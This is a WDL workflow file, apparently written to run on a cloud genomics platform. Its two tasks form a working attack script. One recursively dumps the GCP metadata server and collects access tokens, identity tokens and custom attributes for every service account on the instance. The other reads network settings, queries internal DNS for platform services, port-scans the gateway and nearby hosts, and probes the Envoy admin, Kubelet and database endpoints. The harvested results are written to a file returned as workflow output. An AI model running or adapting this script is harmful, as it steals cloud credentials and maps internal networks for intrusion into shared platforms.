version 1.0

workflow SSRFAndInternalServices {
    call MetadataSSRF
    call InternalServiceDiscovery
}

# Расширенный SSRF через metadata — включая v1beta1 и рекурсивный дамп
task MetadataSSRF {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: METADATA SSRF (EXTENDED)" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Full recursive metadata dump
        echo "=== Full Metadata Tree ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>&1 | \
          python3 -m json.tool 2>/dev/null >> results.txt || \
          curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>&1 >> results.txt
        echo "" >> results.txt

        # v1beta1 (sometimes less restricted)
        echo "=== v1beta1 Metadata ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true" 2>&1 >> results.txt
        echo "" >> results.txt

        # Without Metadata-Flavor header (v1beta1 didn't require it)
        echo "=== No Header (v1beta1) ===" >> results.txt
        curl -s "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" 2>&1 >> results.txt
        echo "" >> results.txt

        # Custom metadata (often has secrets)
        echo "=== Custom Metadata Keys ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" 2>&1 >> results.txt
        echo "" >> results.txt

        # Read each custom attribute
        for attr in $(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" 2>/dev/null); do
            echo "--- Attribute: $attr ---" >> results.txt
            curl -s -H "Metadata-Flavor: Google" \
              "http://metadata.google.internal/computeMetadata/v1/instance/attributes/$attr" 2>&1 | head -50 >> results.txt
            echo "" >> results.txt
        done

        # Identity token (useful for accessing other GCP services)
        echo "=== Identity Token ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://workbench.verily.com" 2>&1 >> results.txt
        echo "" >> results.txt

        # All service accounts on this instance
        echo "=== All SAs ===" >> results.txt
        for sa in $(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null); do
            sa_clean=$(echo "$sa" | tr -d '/')
            echo "--- SA: $sa_clean ---" >> results.txt
            echo "Email:" >> results.txt
            curl -s -H "Metadata-Flavor: Google" \
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/${sa_clean}/email" 2>&1 >> results.txt
            echo "" >> results.txt
            echo "Scopes:" >> results.txt
            curl -s -H "Metadata-Flavor: Google" \
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/${sa_clean}/scopes" 2>&1 >> results.txt
            echo "" >> results.txt
            echo "Token:" >> results.txt
            curl -s -H "Metadata-Flavor: Google" \
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/${sa_clean}/token" 2>&1 >> results.txt
            echo "" >> results.txt
        done

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}

# Сканируем внутреннюю сеть — ищем сервисы
task InternalServiceDiscovery {
    command <<<
        echo "========================================" > results.txt
        echo " VECTOR: INTERNAL SERVICE DISCOVERY" >> results.txt
        echo "========================================" >> results.txt
        echo "" >> results.txt

        # Our network info
        echo "=== Network Info ===" >> results.txt
        ip addr 2>&1 >> results.txt
        ip route 2>&1 >> results.txt
        echo "" >> results.txt

        # DNS resolution
        echo "=== DNS ===" >> results.txt
        cat /etc/resolv.conf >> results.txt
        echo "" >> results.txt

        # Try internal DNS discovery
        echo "=== Internal DNS Queries ===" >> results.txt
        for svc in cromwell batch-agent terra leonardo sam agora rawls firecloud; do
            echo "--- $svc ---" >> results.txt
            nslookup $svc 2>&1 | head -5 >> results.txt
            nslookup $svc.default.svc.cluster.local 2>&1 | head -5 >> results.txt
            echo "" >> results.txt
        done

        GATEWAY=$(ip route | grep default | awk '{print $3}' 2>/dev/null)
        MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
        SUBNET=$(echo "$MY_IP" | awk -F. '{print $1"."$2"."$3}')

        # Scan gateway and nearby IPs for common service ports
        echo "=== Port scan (common services) ===" >> results.txt
        for ip in "$GATEWAY" "${SUBNET}.1" "${SUBNET}.2" "${SUBNET}.3" "10.0.0.1" "10.128.0.1" "172.17.0.1"; do
            for port in 80 443 8080 8443 8000 9090 3000 5000 6443 2375 2376 10250 10255 15000 15001 15006 15090; do
                result=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 "http://${ip}:${port}/" 2>/dev/null)
                if [ "$result" != "000" ]; then
                    echo "[${result}] http://${ip}:${port}" >> results.txt
                fi
            done
        done
        echo "" >> results.txt

        # Envoy/Istio sidecar
        echo "=== Envoy/Istio ===" >> results.txt
        curl -s --max-time 3 http://localhost:15000/server_info 2>&1 | head -30 >> results.txt
        echo "" >> results.txt
        curl -s --max-time 3 http://localhost:15000/config_dump 2>&1 | head -200 >> results.txt
        echo "" >> results.txt
        curl -s --max-time 3 http://localhost:15000/clusters 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # Kubelet API
        echo "=== Kubelet API ===" >> results.txt
        curl -sk --max-time 3 "https://${GATEWAY}:10250/pods" 2>&1 | head -100 >> results.txt
        curl -sk --max-time 3 "https://${GATEWAY}:10255/pods" 2>&1 | head -100 >> results.txt
        echo "" >> results.txt

        # Cloud SQL proxy
        echo "=== Cloud SQL Proxy ===" >> results.txt
        curl -s --max-time 3 "http://localhost:3306/" 2>&1 | head -5 >> results.txt
        curl -s --max-time 3 "http://localhost:5432/" 2>&1 | head -5 >> results.txt
        echo "" >> results.txt

        cat results.txt
    >>>
    output { File result = "results.txt" }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}
